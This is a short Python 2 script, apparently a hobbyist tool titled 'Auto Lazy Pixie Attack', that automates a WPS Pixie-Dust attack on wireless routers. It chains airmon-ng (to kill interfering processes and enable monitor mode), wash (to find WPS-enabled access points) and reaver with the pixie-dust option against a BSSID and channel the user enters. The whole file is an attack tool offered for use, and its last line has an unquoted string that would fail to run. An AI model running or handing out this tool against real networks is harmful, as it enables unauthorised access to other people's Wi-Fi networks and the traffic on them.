import os
os.system('clear')

def collect():
	os.system('clear')
	print """
Auto Lazy Pixie Attack
Script to automate WPS Pixie attack
Bluedangerforyou

"""

	interface = raw_input("Enter interface -example: wlan0 >> ")
	washcommand = "\'wash " + "-i " + interface + "mon\' --full-screen"

	print '...running kill check on interface...'
	os.system('airmon-ng check kill')
	print '...putting ' + interface + ' into monitor mode...'
	os.system('airmon-ng start ' + interface)
	os.system("gnome-terminal -e " + washcommand)
	os.system('clear')
	print 'A new terminal is opening. Pick a WPS enabled AP'
	BSSID = raw_input("Paste the BSSID>> ")
	channel = raw_input("What channel is AP?>> ")
	print 'Running reaver attack...'
	os.system('reaver -i ' + interface + 'mon -b ' + BSSID + ' -c ' + channel + ' -vvv -K 1 -f')
	raw_input(Press enter to exit)
collect()


